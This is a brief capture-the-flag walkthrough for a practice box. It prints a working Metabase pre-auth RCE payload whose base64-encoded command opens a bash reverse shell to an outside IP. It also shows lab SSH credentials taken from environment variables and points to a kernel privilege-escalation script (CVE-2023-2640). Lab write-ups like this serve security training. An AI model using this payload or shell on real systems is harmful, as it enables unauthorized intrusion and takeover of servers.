@@ -1,0 +1,26 @@
+** Seasonal Box **
+
+In the website the login has a preauth RCE CVE
+
+payload:
+zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS42OC80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}')\n$$--=x
+
+https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/ ==> CVE
+
+java -cp h2-*.jar org.h2.tools.Shell -url "jdbc:h2:/metabase.db/metabase.db.mv.db"
+
+Using the env command we can get a list of items talking about our environment
+META_USER=metalytics
+META_PASS=An4lytics_ds20223#
+
+metalytics:An4lytics_ds20223# ==> SSH
+----------------------------------------------------------------------
+For root it is a bit tricky, you will need to try searching about the kernel, see if anything can be exploited
+uname -a ==> gives u the kernal version
+`Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux`
+
+CVE-2023-2640 ==> https://github.com/OllaPapito/gameoverlay/blob/babydoge/overlay.sh
+
+Running this simple bash script escs us to root!
+
+Concerning the Kernel, there are a number of CVEs that work against this box
